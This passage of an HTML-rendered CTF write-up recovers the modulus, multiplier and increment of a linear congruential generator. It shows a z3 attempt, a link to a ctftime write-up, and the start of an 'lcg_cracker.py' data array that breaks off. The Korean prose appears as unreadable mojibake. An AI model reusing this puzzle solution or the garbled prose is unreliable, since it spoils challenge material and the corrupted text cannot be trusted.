class="string">&#x27;c&#x27;</span>)</span><br><span class="line">m = Int(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(m &gt; <span class="number">0</span>)</span><br><span class="line">s.add(a &gt; <span class="number">0</span>)</span><br><span class="line">s.add(c &gt;= <span class="number">0</span>)</span><br><span class="line">s.add(m &gt; a)</span><br><span class="line">s.add(m &gt; c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="comment"># s.add((a * seed[i] + c) % m == seed[i+1])</span></span><br><span class="line">    s.add( ((a%m * seed[i]%m + c%m) % m) == seed[i+<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(s.check())</span><br><span class="line">    <span class="comment"># print(s.model())</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>Ï≤òÏùåÏóêÎäî Ïù¥Îü∞ÏãùÏúºÎ°ú z3Î•º Ïù¥Ïö©Ìï¥ÏÑú Î¨∏Ï†úÎ•º ÌíÄÍ≥† Ïã∂ÏóàÎã§. ÌïòÏßÄÎßå ÏÜçÎèÑÍ∞Ä ÎÑàÎ¨¥ Ïò§Îûò Í±∏Î†∏Îã§. <code>m</code>, <code>a</code>, <code>c</code>Î•º Íµ¨ÌïòÎäîÎç∞ ÌïòÎ£®Ï¢ÖÏùº Í±∏Î¶¥ Í≤É Í∞ôÏïÑÏÑú ÎèåÎ†§ÎÜìÍ≥† Îã§Î•∏ Î∞©Î≤ïÏùÑ Ï∞æÍ∏∞Î°ú ÌñàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>Í≤∞Íµ≠ ÏïÑÎûò Î°∏ÏóÖ Ï∞∏Í≥†Ìï¥ÏÑú <code>m</code>, <code>a</code>, <code>c</code>Î•º Íµ¨ÌïòÎäî Ïä§ÌÅ¨Î¶ΩÌä∏Î•º Ï∞æÏïòÍ≥† Í∑∏ÎåÄÎ°ú Ïù¥Ïö©ÌñàÎã§!.</p><ul><li><a href="https://ctftime.org/writeup/12046">https://ctftime.org/writeup/12046</a></li></ul><h3 id="Solved-Code"><a href="#Solved-Code" class="headerlink" title="Solved Code"></a>Solved Code</h3><ul><li><code>lcg_cracker.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">value_arr = [</span><br><span class="line">[<span class="number">8867289026099616930</span>, <span class="number">3100388368458364911</span>, <span class="number">11012612612822111152</span>, <span class="number">3553763262634053301</span>, <span class="number">5401992163525506830</span>, <span class="number">3802577809068939019</span>, <span class="number">4123451793823069756</span>, <span class="number">7817012668148538993</span>, <span class="number">4418295964672193722</span>, <span class="number">9714516383028541031</span>],</span><br><span class="line">[<span class="number">14895006062848545614</span>, <span class="number">13184494282524308555</span>, <span class="number">5839645882409261180</span>, <span class="number">15553940338338437553</span>, <span class="number">3310727070198197498</span>, <span class="number">7079238959161008039</span>, <span class="number">8852142265661212744</span>, <span class="number">2055261898208476077</span>, <span class="number">12685862460417988070</span>, <span class="number">8327538304492250947</span>],</span><br><span class="line">[<span class="number">16833079321975897880</span>, <span class="number">17784340646344753597</span>, <span class="number">9634395732957591606</span>, <span class="number">690518920529962707</span>, <span class="number">10752317369148323620</span>, <span class="number">4040135522852265209</span>, <span class="number">2068189971163025250</span>, <span class="number">13577899494281881007</span>, <span class="number">14537861419972208752</span>, <span class="number">6988257997766616693</span>],</span><br><span class="line">[<span class="number">8811210512227857652</span>, <span class="number">17677714985016526345</span>, <span class="number">2277225101309911218</span>, <span class="number">9554579400707461183</span>, <span class="number">13629936068980515136</span>, <span class="number">18128385074177963653</span>, <span class="number">14926717179739533854</span>, <span class="number">15372561348002497115</span>, <span class="number">9242320810727858892</span>, <span class="number">10530837434097508673</span>],</span><br><span class="line">[<span class="number">2991159697670699038</span>, <span class="number">3475834328473165915</span>, <span class="number">24895706424277196</span>, <span class="number">1717803743275126593</span>, <span class="number">7847993843726425290</span>, <span class="number">6555997079546348215</span>, <span class="number">9641940719668788120</span>, <span class="number">1211123003602522173</span>, <span class="number">9780510953735823542</span>, <span class="number">10772469154227966291</span>],</span><br><span class="line">[<span class="number">3185088266943822372</span>, <span class="number">16856905608318675961</span>, <span class="number">981610330286889570</span>, <span class="number">12390880568666725551</span>, <span class="number">6420531847364688752</span>, <span class="number">294839699134285173</span>, <span class="number">1897195166556125390</span>, <span class="number">1779257976405790667</span>, <span class="number">12088335929742246396</span>, <span class="number">3991695835285178673</span>],</span><br><span class="line">[<span class="number">10238209914032284972</span>, <span class="number">5460209267264701729</span>, <span class="number">7819557967073387050</span>, <span class="number">4593921590486709655</span>, <span class="number">3385940490520588792</span>, <span class="number">12268964961406007325</span>, <span class="number">16455099020084682774</span>, <span class="number">10150443889560462899</span>, <span class="number">17851097652418530308</span>, <span class="number">14240629152048184665</span>],</span><br><span class="line">[<span class="number">8349943537494362534</span>, <span class="number">4297037802114914819</span>, <span class="number">1347703166576296724</span>, <span class="number">757798125216715945</span>, <span class="number">15394582492534297042</span>, <span class="number">10761779783422053855</span>, <span class="number">4693042107739651424</span>, <span class="number">10225256180973570853</span>, <span class="number">4566401686213427518</span>, <span class="number">1487067095664121339</span>],</span><br><span class="line">[<span class="number">11987973417146959732</span>, <span class="number">15513426539919950473</span>, <span class="number">515274979322588978</span>, <span class="number">17107229499549087935</span>, <span class="number">18253958825185315776</span>, <span class="number">5144561925537278725</span>, <span class="number">4486635461590751390</span>, <span class="number">14429941670409020123</span>, <span class="number">17988539351616152908</span>, <span class="number">5277362322974592449</span>],</span><br><span class="line">[<span class="number">3272875691678361420</span>, <span class="number">4467493841292318657</span>, <span class="number">13109169869817161546</span>, <span class="number">642261405616117559</span>, <span class="number">7422548840093008408</span>, <span class="number">14093779976259686589</span>, <span class="number">13240126529021690678</span>, <span class="number">9678270890728627667</span>, <span class="number">3717904806731450916</span>, <span class="number">16727758706245942265</span>],</span><br><span class="line">[<span class="number">13961749608401819040</span>, <span class="number">4130031146828829797</span>, <span class="number">8270988025545981822</span>, <span class="number">17295851551386197307</span>, <span class="number">12822136328236310828</span>, <span class="number">17730435183956521249</span>, <span class="number">5914918828169559594</span>, <span class="number">2301029522089476503</span>, <span class="number">11197084434497465848</span>, <span class="number">16282318958233527325</span>],</span><br><span class="line">[<span class="number">13935820998792231868</span>, <span class="number">2340957083767314929</span>, <span class="number">13952086190268317242</span>, <span class="number">3463255295617205735</span>, <span class="number">17603686513072576392</span>, <span class="number">15616004610886916077</span>, <span class="number">7593161876043215654</span>, <span class="number">7419335383114434947</span>, <span class="number">13872051444738117780</span>, <span class="number">16387601927742994473</span>],</span><br><span class="line">[<span class="number">2367708137021733318</span>, <span class="number">15797908864823186083</span>, <span class="number">1697811323936294452</span>, <span class="number">6468516909347007561</span>, <span class="number">3605808975914282994</span>, <span class="number">8993146379861355647</span>, <span class="number">11784545778018336384</span>, <span class="number">1476919440044939461</span>, <span class="number">9673720994553064798</span>, <span class="number">3403961970617612955</span>],</span><br><span class="line">[<span class="number">14632104118495609642</span>, <span class="number">13491004195881278103</span>, <span class="number">8542085830330608376</span>, <span class="number">17554856007815877917</span>, <span class="number">12246699748174721302</span>, <span class="number">14918799307125947187</span>, <span class="number">14826228137665017092</span>, <span class="number">8438817444860840537</span>, <span class="number">10429337410401897026</span>, <span class="number">201262443058381839</span>],</span><br><span class="line">[<span class="number">727242865172403940</span>, <span class="number">13286269549476768697</span>, <span class="number">12862139302129010978</span>, <span class="number">2043896308843279983</span>, <span class="number">11901636794219457584</span>, <span class="number">9556199557922302261</span>, <span class="number">13741726916804549518</span>, <span class="number">7395209500326784395</span>, <span class="number">12207365532390229692</span>, <span class="number">12204738417996026097</span>],</span><br><span class="line">[<span class="number">5226361193323484432</span>, <span class="number">10130784938838945173</span>, <span class="number">16494630052633807214</span>, <span class="number">12878085135450049259</span>, <span class="number">3144158807994921372</span>, <span class="number">14032772940844506961</span>, <span class="number">9030641085374296346</span>, <span class="number">14371680458411244615</span>, <span class="number">13968515723769642856</span>, <span class="number">4596893107208673101</span>],</span><br><span class="line">[<span class="number">5582569318269685702</span>, <span class="number">16262401486417281187</span>, <span class="number">15301058140219305012</span>, <span class="number">4308599473687603785</span>, <span class="number">2145458505091835378</span>, <span class="number">462684261660228223</span>, <span class="number">13478469980846195840</span>, <span class="number">7677224992909932229</span>, <span class="number">13219690446917878622</span>, <span class="number">8268181225565595803</span>],</span><br><span class="line">[<span class="number">1523660276195024986</span>, <span class="number">12898838688908966023</span>, <span class="number">4576153996660178088</span>, <span class="number">2159976516489910669</span>, <span class="number">1464427048127423302</span>, <span class="number">8811745952244449827</span>, <span class="number">17714660346161386420</span>, <span class="number">4826455020305256393</span>, <span class="number">984003074290762098</span>, <span class="number">12555979904933929983</span>],</span><br><span class="line">[<span class="number">126547082954464156</span>, <span class="number">8731748723858026833</span>, <span class="number">12194851587498199834</span>, <span class="number">11341276220445965895</span>, <span class="number">7784808114970478952</span>, <span class="number">2196181795386050893</span>, <span class="number">3962591291961098758</span>, <span class="number">15164382113382091747</span>, <span class="number">13324697695629440116</span>, <span class="number">15513681386663338889</span>],</span><br><span class="line">[<span class="number">2109089224935408226</span>, <span class="number">16399948004576306351</span>, <span class="number">6345023819482489712</span>, <span class="number">13531529848972103029</span>, <span class="number">11338355893597528270</span>, <span class="number">7583305562428282827</span>, <span class="number">6739249743684069884</span>, <span class="number">3839630471462031665</span>, <span class="number">6680085498946462330</span>, <span class="number">18204041658276662055</span>],</span><br><span class="line">[<span class="number">14630982926170580926</span>, <span class="number">13413641925454296699</span>, <span class="number">3204089170868891500</span>, <span class="number">18167967979148445793</span>, <span class="number">17657937622702801514</span>, <span class="number">912587101662897879</span>, <span class="number">7628277793611298872</span>, <span class="number">9842333695312176989</span>, <span class="number">15038238322996354134</span>, <span class="number">4620776159013544819</span>],</span><br><span class="line">[<span class="number">14704701709580170488</span>, <span class="number">53493907006424861</span>, <span class="number">3691079583443315478</span>, <span class="number">14876818299364597043</span>, <span class="number">11929538602131857156</span>, <span class="number">11481424303877872729</span>, <span class="number">17455025871772050498</span>, <span class="number">5358420361150629391</span>, <span class="number">796123445202395728</span>, <span class="number">18039029571546202069</span>],</span><br><span class="line">[<span class="number">18200670961985626810</span>, <span class="number">1467699364758740071</span>, <span class="number">9037535799805306888</span>, <span class="number">14847415754150972013</span>, <span class="number">9900762982391730086</span>, <span class="number">623115057775966211</span>, <span class="number">6101450839122565396</span>, <span class="number">15171738277846876841</span>, <span class="number">13832273043699611602</span>, <span class="number">13642892256086068191</span>],</span><br><span class="line">[<span class="number">2782294491294682690</span>, <span class="number">7510879162237589519</span>, <span class="number">1741828130526231632</span>, <span class="number">9505676564052672981</span>, <span class="number">10255640339800129198</span>, <span class="number">6662908645245953323</span>, <span class="number">17018838752941540572</span>, <span class="number">12154997309264547729</span>, <span class="number">8591331022323970650</span>, <span class="number">2506030181648323207</span>],</span><br><span class="line">[<span class="number">11234052632499834174</span>, <span class="number">386380546687390203</span>, <span class="number">8213513647720372460</span>, <span class="number">13330119481419151329</span>, <span class="number">15887784606153412586</span>, <span class="number">7899237475721923159</span>, <span class="number">10091807687235701176</span>, <span class="number">13805199692009971421</span>, <span class="number">11774830989500895702</span>, <span class="number">806599032341532403</span>],</span><br><span class="line">[<span class="number">8300049183692798058</span>, <span class="number">854327389806965975</span>, <span class="number">3608357675551997496</span>, <span class="number">9169006654863656285</span>, <span class="number">5472160679467528790</span>, <span class="number">8644205409068454259</span>, <span class="number">6154362867017692228</span>, <span class="number">375924128901076633</span>, <span class="number">7492020820464736130</span>, <span class="number">440602548199347791</span>],</span><br><span class="line">[<span class="number">11558370982278543894</span>, <span class="number">4317602607708809267</span>, <span class="number">2766674752555013636</span>, <span class="number">6433117189200424793</span>, <span class="number">1163228285800072002</span>, <span class="number">6475775425366761743</span>, <span class="number">4106646581277321552</span>, <span class="number">6657453002491912917</span>, <span class="number">16642399402912752558</span>, <span class="number">4627426230987726379</span>],</span><br><span class="line">[<span class="number">9176831416081544290</span>, <span class="number">6012069203501801135</span>, <span class="number">9004405420014142832</span>, <span class="number">12561419548560652149</span>, <span class="number">18187721460045624014</span>, <span class="number">574183730898547147</span>, <span class="number">2725189284580649980</span>, <span class="number">3570619898969332529</span>, <span class="number">6565100070659773562</span>, <span class="number">10270047106495137063</span>],</span><br><span class="line">[<span class="number">13677842479808722104</span>, <span class="number">2987183347614692829</span>, <span class="number">3201466174608737494</span>, <span class="number">17986981237197819379</span>, <span class="number">5169852428109578948</span>, <span class="number">6231680139079466777</span>, <span class="number">5710815901163520514</span>, <span class="number">6664671632382331599</span>, <span class="number">17140484865351641616</span>, <span class="number">2101834991851968149</span>],</span><br><span class="line">[<span class="number">4633588486946452916</span>, <span class="number">6122956346242873801</span>, <span class="number">16655618269148156786</span>, <span class="number">5539528001230618111</span>, <span class="number">13292550610721617408</span>, <span class="number">13295532528023572037</span>, <span class="number">13501284821858441438</span>, <span class="number">9251449022754878491</span>, <span class="number">11160684063961861004</span>, <span class="number">13770693391276793089</span>],</span><br><span class="line">[<span class="number">17299383331387067396</span>, <span class="number">13065829148296346969</span>, <span class="number">16098495694389463362</span>, <span class="number">3991558490299875087</span>, <span class="number">17163118798757658448</span>, <span class="number">3663576396867129557</span>, <span class="number">12979098425607768494</span>, <span class="number">10114075828877548587</span>, <span class="number">15341701465297442780</span>, <span class="number">7112988904079109777</span>],</span><br><span class="line">[<span class="number">1428568366097891942</span>, <span class="number">6337496892206785987</span>, <span class="number">13012171866948546004</span>, <span class="number">12396143281391196777</span>, <span class="number">6783659025353203346</span>, <span class="number">6903870906632240543</span>, <span class="number">15198490714885807136</span>, <span class="number">15678191199385801957</span>, <span class="number">11884036482466341374</span>, <span class="number">8341778046957283771</span>],</span><br><span class="line">[<span class="number">12077661547009871844</span>, <span class="number">3255163426751334585</span>, <span class="number">3245347561327467042</span>, <span class="number">2568052847080606575</span>, <span class="number">11174949785175889200</span>, <span class="number">14755028155044738613</span>, <span class="number">3526018644061625486</span>, <span class="number">3487613482027987595</span>, <span class="number">837657301706973116</span>, <span class="number">2458121596652490225</span>],</span><br><span class="line">[<span class="number">5523160823405994428</span>, <span class="number">12163215340822583281</span>, <span class="number">9158375199828423738</span>, <span class="number">4738590282036483047</span>, <span class="number">13368080207454952840</span>, <span class="number">60330628914165229</span>, <span class="number">4162813395077400870</span>, <span class="number">10532963154697385859</span>, <span class="number">7351438799447111316</span>, <span class="number">9187187171692787241</span>],</span><br><span class="line">[<span class="number">873931018331865996</span>, <span class="number">4961008043770098945</span>, <span class="number">10268161693364898186</span>, <span class="number">7526882041215013495</span>, <span class="number">2846026779968485976</span>, <span class="number">11908407080730016253</span>, <span class="number">10023349327150850422</span>, <span class="number">9081572846155269395</span>, <span class="number">17885971952298384996</span>, <span class="number">16646955843758158137</span>],</span><br><span class="line">[<span class="number">14117057574820939498</span>, <span class="number">14846280829748141399</span>, <span class="number">9822453198596417720</span>, <span class="number">13666484049608964573</span>, <span class="number">2203451663831423190</span>, <span class="number">4464212214691787251</span>, <span class="number">12882737634380494532</span>, <span class="number">3465181234195645209</span>, <span class="number">17736576274984900098</span>, <span class="number">6338654109127700175</span>],</span><br><span class="line">[<span class="number">5658271824067632014</span>, <span class="number">3039130312766025099</span>, <span class="number">6785806770050664124</span>, <span class="number">7052065290757034225</span>, <span class="number">6977159145787019578</span>, <span class="number">1808635142856008935</span>, <span class="number">14115360414807306888</span>, <span class="number">14729176788807491309</span>, <span class="number">1742274373691561510</span>, <span class="number">9536467342460434563</span>],</span><br><span class="line">[<span class="number">8457322449329128800</span>, <span class="number">11706182718713787173</span>, <span class="number">14516612421740595518</span>, <span class="number">5522077119785303547</span>, <span class="number">12088439790994912492</span>, <span class="number">3998862261719139297</span>, <span class="number">17667079026686888938</span>, <span class="number">1543343976564930135</span>, <span class="number">14257014014432421304</span>, <span class="number">6056531089230834397</span>],</span><br><span class="line">[<span class="number">5853949490429562094</span>, <span class="number">16540889291739200619</span>, <span class="number">16069972633722194204</span>, <span class="number">2023467304258303185</span>, <span class="number">10492035477856058522</span>, <span class="number">4527429097395525063</span>, <span class="number">17244702540938403560</span>, <span class="number">9292854607338542285</span>, <span class="number">14017669400234662790</span>, <span class="number">7988496783295048547</span>],</span><br><span class="line">[<span class="number">8990859015354022950</span>, <span class="number">11626717627012380291</span>, <span class="number">9033521094343520660</span>, <span class="number">14570401077287722281</span>, <span class="number">9233494352537050194</span>, <span class="number">9921811818931708511</span>, <span class="number">2075484779034477536</span>, <span class="number">14081241237412088741</span>, <span class="number">12374953548537439166</span>, <span class="number">5321567458443928187</span>],</span><br><span class="line">[<span class="number">2501824620693468540</span>, <span class="number">6605202164463364785</span>, <span class="number">13037091578942931450</span>, <span class="number">14115603409003792551</span>, <span class="number">14745943388365002056</span>, <span class="number">2899169743159803053</span>, <span class="number">15575271540930894566</span>, <span class="number">4782580049077731395</span>, <span class="number">16403374133301088852</span>, <span class="number">6581426701492482281</span>],</span><br><span class="line">[<span class="number">10614745564617910298</span>, <span class="number">12994425083963297607</span>, <span class="number">11171615255409057384</span>, <span class="number">14524945601133343309</span>, <span class="number">6097066497884901126</span>, <span class="number">14869218732448042211</span>, <span class="number">11405168484889573748</span>, <span class="number">12193374361579420809</span>, <span class="number">11239347632050213170</span>, <span class="number">751735515663540927</span>],</span><br><span class="line">[<span class="number">11822229604799408924</span>, <span class="number">4077103487938944721</span>, <span class="number">4618979562143911578</span>, <span class="number">5114940534867521479</span>, <span class="number">2442759505377501416</span>, <span class="number">2529709207661633229</span>, <span class="number">8529238665266728326</span>, <span class="number">16668401618408154467</span>, <span class="number">6421579100170458100</span>, <span class="number">367100142732370185</span>],</span><br><span class="line">[<span class="number">5451434008959662308</span>, <span class="number">7214065144025667001</span>, <span class="number">18155149021322681122</span>, <span class="number">16773429532725039215</span>, <span class="number">13668505188035505712</span>, <span class="number">2342910215262761781</span>, <span class="number">14086852263454150030</span>, <span class="number">12762114345439668107</span>, <span class="number">13588918370988173500</span>, <span class="number">15298163912706390769</span>],</span><br><span class="line">[<span class="number">2298694336461850902</span>, <span class="number">11035956626191299379</span>, <span class="number">5164500185108040964</span>, <span class="number">5862375371973345881</span>, <span class="number">17122275118260281922</span>, <span class="number">845362442548149263</span>, <span class="number">2989776314693644368</span>, <span class="number">3380380903056393685</span>, <span class="number">11885353426376544942</span>, <span class="number">8432647176761329963</span>],</span><br><span class="line">[<span class="number">15069683516895607374</span>, <span class="number">6790494538062018379</span>, <span class="number">7375521283540477820</span>, <span class="number">10848878574135076017</span>, <span class="number">10702858666938180602</span>, <span class="number">627485070352396967</span>, <span class="number">6402981706896287560</span>, <span class="number">17530624080524154541</span>, <span class="number">10574696765045808358</span>, <span class="number">10231057913488263747</span>],</span><br><span class="line">[<span class="number">11711156544779800568</span>, <span class="number">14859806420295519773</span>, <span class="number">10755718946365525526</span>, <span class="number">4274844350839196723</span>, <span class="number">18263099102261299716</span>, <span class="number">5775241043780170585</span>, <span class="number">11110006472931186498</span>, <span class="number">10273939610160252175</span>, <span class="number">7925558300094438736</span>, <span class="number">11907944568939275989</span>],</span><br><span class="line">[<span class="number">10746209935196001034</span>, <span class="number">3618722580142006775</span>, <span class="number">9884185071574296536</span>, <span class="number">17925983285082602877</span>, <span class="number">960993732159640310</span>, <span class="number">10968335297886526611</span>, <span class="number">498628532078719972</span>, <span class="number">15958624639722126521</span>, <span class="number">12787199791963184674</span>, <span class="number">15319814181110816623</span>],</span><br><span class="line">[<span class="number">17924571917219383696</span>, <span class="number">863609349597516821</span>, <span class="number">4248812901100005870</span>, <span class="number">16466929070257130859</span>, <span class="number">10966717351459380764</span>, <span class="number">386990228605656529</span>, <span class="number">8255581700080748954</span>, <span class="number">16232815094285129415</span>, <span class="number">13259597083100832744</span>, <span class="number">11021739122189430221</span>],</span><br><span class="line">[<span class="number">2798086452070131370</span>, <span class="number">8600524455743548439</span>, <span class="number">3140377087599190648</span>, <span class="number">13771834233539087005</span>, <span class="number">9472614355009870998</span>, <span class="number">7974347915846792371</span>, <span class="number">15274428055851676804</span>, <span class="number">2471123652321257433</span>, <span class="number">4486835346780798402</span>, <span class="number">14443733748522263951</span>],</span><br><span class="line">[<span class="number">364510442556624052</span>, <span class="number">6704476462697508041</span>, <span class="number">1440274083389264498</span>, <span class="number">7145191385311492351</span>, <span class="number">13402859670044630272</span>, <span class="number">2460113547601908037</span>, <span class="number">3727138121145690078</span>, <span class="number">17364857400828444443</span>, <span class="number">17583539939751363212</span>, <span class="number">14225891051723206657</span>],</span><br><span class="line">[<span class="number">10679737800641080988</span>, <span class="number">17478889369562075217</span>, <span class="number">7005001708662335002</span>, <span class="number">3729771981252773191</span>, <span class="number">17546593748217179240</span>, <span class="number">11676603835864512589</span>, <span class="number">12475669505140649222</span>, <span class="number">12270968464065422051</span>, <span class="number">16593340703584298868</span>, <span class="number">1242375977324421769</span>],</span><br><span class="line">[<span class="number">4495563215113416740</span>, <span class="number">15045956663472929273</span>, <span class="number">5153341651897229410</span>, <span class="number">5092436580427348655</span>, <span class="number">889986649005576560</span>, <span class="number">6068846560256127861</span>, <span class="number">12922043036062686926</span>, <span class="number">6177253950266920395</span>, <span class="number">1955408873097820156</span>, <span class="number">5796003727782729521</span>],</span><br><span class="line">[<span class="number">17028974797201535468</span>, <span class="number">12854384363204195553</span>, <span class="number">1508805523031015658</span>, <span class="number">11873860720592322391</span>, <span class="number">7639650477649973944</span>, <span class="number">10627048893980756957</span>, <span class="number">13843354809999717078</span>, <span class="number">14407534130793346035</span>, <span class="number">16442419118134640836</span>, <span class="number">9275530655007569177</span>],</span><br><span class="line">[<span class="number">246905628842646592</span>, <span class="number">17036488390142614917</span>, <span class="number">13372822276138677534</span>, <span class="number">387533368091169115</span>, <span class="number">8293058324581117388</span>, <span class="number">371958111100999745</span>, <span class="number">7218365592259430858</span>, <span class="number">5135875742835639</span>, <span class="number">354375426255659160</span>, <span class="number">6005160337930930493</span>],</span><br><span class="line">[<span class="number">15492028295530370278</span>, <span class="number">17485540190151107139</span>, <span class="number">7463908329305537620</span>, <span class="number">16947584731924202217</span>, <span class="number">7238469859068201234</span>, <span class="number">1392330285547991583</span>, <span class="number">3837069334263661216</span>, <span class="number">6503367032258901349</span>, <span class="number">6010467456834954366</span>, <span class="number">8893884900001715771</span>],</span><br><span class="line">[<span class="number">15432599508868324242</span>, <span class="number">13384953910469930655</span>, <span class="number">1224616136947634464</span>, <span class="number">10711537154548571621</span>, <span class="number">1226300715469377278</span>, <span class="number">10827773072548825787</span>, <span class="number">9246579057486914732</span>, <span class="number">10824656460472361633</span>, <span class="number">9031532824210888106</span>, <span class="number">14433210438136076055</span>],</span><br><span class="line">[<span class="number">7575212830376199740</span>, <span class="number">6180851232090336881</span>, <span class="number">2203621318913557690</span>, <span class="number">4475918415359067751</span>, <span class="number">13690465480422849032</span>, <span class="number">3858170389989450861</span>, <span class="number">7959339877338386854</span>, <span class="number">14238873398771696131</span>, <span class="number">4804828608640797460</span>, <span class="number">17938524743152647337</span>],</span><br><span class="line">[<span class="number">13784859698773207124</span>, <span class="number">10371371456164159209</span>, <span class="number">14648355674364024082</span>, <span class="number">14612361550801874463</span>, <span class="number">12128767025013550752</span>, <span class="number">6781441409005179237</span>, <span class="number">6750855378618577022</span>, <span class="number">4640419281943024187</span>, <span class="number">6594281201006291500</span>, <span class="number">12283545100404874785</span>],</span><br><span class="line">[<span class="number">7300966056528243488</span>, <span class="number">5704567910290907109</span>, <span class="number">6233560262172006654</span>, <span class="number">5840544394548772027</span>, <span class="number">15615937675964685996</span>, <span class="number">7588543366409340065</span>, <span class="number">7100658218377019306</span>, <span class="number">10330071151565990167</span>, <span class="number">11798634657090360184</span>, <span 